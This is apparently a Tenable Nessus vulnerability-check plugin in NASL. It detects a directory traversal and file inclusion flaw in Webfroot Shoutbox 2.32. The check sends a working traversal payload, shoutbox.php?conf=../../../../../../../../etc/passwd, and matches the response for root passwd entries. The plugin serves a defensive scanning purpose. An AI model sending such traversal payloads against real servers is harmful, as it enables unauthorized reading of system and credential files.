#
# (C) Tenable Network Security, Inc.
#

#
# Ref:
#  Date: Thu, 29 May 2003 11:52:54 +0800
#  From: pokleyzz <pokleyzz@scan-associates.net>
#  To: vulnwatch@vulnwatch.org, bugtraq@securityfocus.com
#  Cc: tech@scan-associates.net
#  Subject: [VulnWatch] Webfroot Shoutbox 2.32 directory traversal and code injection.

include("compat.inc");

if(description)
{
 script_id(11668);
 script_version ("$Revision: 1.22 $");
 script_bugtraq_id(7737, 7746, 7772, 7775);
 script_osvdb_id(15391);

 script_name(english:"Webfroot shoutbox.php conf Parameter Traversal Local File Inclusion");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
directory traversal and code injection vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Webfroot Shoutbox, a PHP application that
allows website visitors to leave one another messages. 

The version of Webfroot Shoutbox installed on the remote host allows
an attacker to read arbitrary files and possibly to inject arbitrary
PHP code into the remote host and gain a shell with the privileges of
the web server." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/vulnwatch/2003/q2/92" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?3e8aa30c" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the Shoutbox 2.33 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/05/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/05/29");
 script_cvs_date("$Date: 2016/11/03 14:16:36 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Checks for the presence of shoutbox.php");
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2003-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);


function check(loc)
{
 local_var r, w;

 w = http_send_recv3(method:"GET", port: port, item:string(loc, "/shoutbox.php?conf=../../../../../../../../etc/passwd"));
 if (isnull(w)) exit(0);
 r = w[2];
 if(egrep(pattern:".*root:.*:0:[01]:.*:.*", string:r))
 {
 	security_hole(port);
	exit(0);
 }
 
 w = http_send_recv3(method:"GET", port: port, item:string(loc, "/shoutbox.php?conf=../"));
 if (isnull(w)) exit(0);
 r = w[2];
 if(egrep(pattern:"main.*ioctl.*/.*/shoutbox\.php.*51", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}
